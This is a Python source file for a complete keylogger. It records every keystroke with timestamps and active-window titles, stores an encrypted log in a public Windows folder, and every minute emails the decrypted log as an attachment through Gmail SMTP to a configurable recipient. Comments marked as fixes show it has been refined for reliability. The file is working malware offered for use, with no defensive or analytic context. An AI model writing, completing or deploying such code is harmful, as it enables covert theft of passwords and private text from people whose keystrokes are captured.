from pynput.keyboard import Key, Listener
import os, smtplib, time, threading
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
import ssl
from cryptography.fernet import Fernet
from datetime import datetime

try:
    import pygetwindow as gw
    WINDOW_TRACKING = True
except ImportError:
    WINDOW_TRACKING = False

class Keylogger:
    def __init__(self):
        self.log = ""
        self.lock = threading.Lock()                          # FIX: race condition guard
        self.log_file = os.path.abspath("C:\\Users\\Public\\Documents\\keylogger_enc.bin")
        self.key_file = os.path.abspath("C:\\Users\\Public\\Documents\\kl.key")
        self.last_window = ""
        self.last_send = time.time()

        # Generate or load encryption key
        self.fernet = self._load_or_create_key()

        self.email = {
            'user': 'your-emil',    
            'pass': 'your-app-pass',        
            'to':   'reciever-email'        
        }

        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)

    # ─── ENCRYPTION ────────────────────────────────────────────────────────────

    def _load_or_create_key(self):
        if os.path.exists(self.key_file):
            with open(self.key_file, 'rb') as f:
                key = f.read()
        else:
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
        return Fernet(key)

    # ─── ACTIVE WINDOW TRACKING ────────────────────────────────────────────────

    def _get_active_window(self):
        if not WINDOW_TRACKING:
            return "Unknown"
        try:
            win = gw.getActiveWindow()
            return win.title if win else "Unknown"
        except Exception:
            return "Unknown"

    # ─── KEYSTROKE CAPTURE ─────────────────────────────────────────────────────

    def on_press(self, key):
        timestamp = datetime.now().strftime('%H:%M:%S')
        current_window = self._get_active_window()

        with self.lock:                                       # FIX: thread-safe log writes
            # Log window change header
            if current_window != self.last_window:
                self.log += f"\n\n[{timestamp}] [Window: {current_window}]\n"
                self.last_window = current_window

            try:
                self.log += key.char
            except AttributeError:
                special = {
                    'Key.space':     ' ',
                    'Key.enter':     f'\n[{timestamp}][ENTER]\n',
                    'Key.backspace': '[BKSP]',
                    'Key.tab':       '[TAB]',
                    'Key.caps_lock': '[CAPS]',
                    'Key.ctrl_l':    '[CTRL]',
                    'Key.ctrl_r':    '[CTRL]',
                    'Key.alt_l':     '[ALT]',
                    'Key.alt_r':     '[ALT]',
                    'Key.shift':     '[SHIFT]',
                    'Key.shift_r':   '[SHIFT]',
                    'Key.delete':    '[DEL]',
                    'Key.left':      '[←]',
                    'Key.right':     '[→]',
                    'Key.up':        '[↑]',
                    'Key.down':      '[↓]',
                }
                self.log += special.get(str(key), f'[{str(key)}]')

    def on_release(self, key):
        return key != Key.esc

    # ─── FILE WRITE (ENCRYPTED) ────────────────────────────────────────────────

    def _write_encrypted_log(self):
        """Encrypt self.log and write to disk."""
        with self.lock:
            data = self.log.encode('utf-8')
        encrypted = self.fernet.encrypt(data)
        with open(self.log_file, 'wb') as f:
            f.write(encrypted)

    def _decrypt_log_bytes(self):
        """Read and decrypt the log file, return plaintext string."""
        with open(self.log_file, 'rb') as f:
            encrypted = f.read()
        return self.fernet.decrypt(encrypted).decode('utf-8')

    # ─── EMAIL SENDING ─────────────────────────────────────────────────────────

    def send_email(self):
        try:
            self._write_encrypted_log()

            # Attach decrypted plaintext for readability
            plaintext = self._decrypt_log_bytes()

            msg = MIMEMultipart()
            msg['From']    = self.email['user']
            msg['To']      = self.email['to']
            msg['Subject'] = f"Keylog Report - {time.strftime('%Y-%m-%d %H:%M:%S')}"

            body = (
                f"Captured at : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Log entries : {len(plaintext)} characters\n"
                f"See attached file for full log."
            )
            msg.attach(MIMEText(body, 'plain'))

            # Attach decrypted log as .txt
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(plaintext.encode('utf-8'))
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename=keylog.txt')
            msg.attach(part)

            ports_to_try = [
                {'port': 587, 'ssl': False},
                {'port': 465, 'ssl': True},
            ]

            for config in ports_to_try:
                try:
                    if config['ssl']:
                        context = ssl.create_default_context()
                        server  = smtplib.SMTP_SSL('smtp.gmail.com', config['port'],
                                                   context=context, timeout=10)
                    else:
                        server = smtplib.SMTP('smtp.gmail.com', config['port'], timeout=10)
                        server.starttls()

                    server.login(self.email['user'], self.email['pass'])
                    server.send_message(msg)
                    server.quit()

                    # Cleanup on success
                    if os.path.exists(self.log_file):
                        os.remove(self.log_file)
                    with self.lock:
                        self.log = ""

                    print(f"[✓] Email sent via port {config['port']} at {time.strftime('%H:%M:%S')}")
                    return True

                except Exception as e:
                    print(f"[!] Port {config['port']} failed: {str(e)[:80]}")
                    continue

            print("[✗] All ports failed — log preserved locally")
            return False

        except Exception as e:
            print(f"[✗] send_email error: {e}")
            return False

    # ─── AUTO-SEND LOOP ────────────────────────────────────────────────────────

    def auto_send(self):
        while self.listener.running:
            time.sleep(1)
            with self.lock:
                has_data = bool(self.log)
            # FIX: update last_send before calling send_email to prevent retry spam
            if time.time() - self.last_send > 60 and has_data:
                self.last_send = time.time()
                self.send_email()

    # ─── START ─────────────────────────────────────────────────────────────────

    def start(self):
        self.listener.start()
        threading.Thread(target=self.auto_send, daemon=True).start()
        print("[+] Keylogger running | Press ESC to stop")
        self.listener.join()

        # Final flush on ESC
        with self.lock:
            has_data = bool(self.log)
        if has_data:
            print("[*] Sending final log before exit...")
            self.send_email()

        print("[+] Keylogger stopped.")


if __name__ == "__main__":
    Keylogger().start()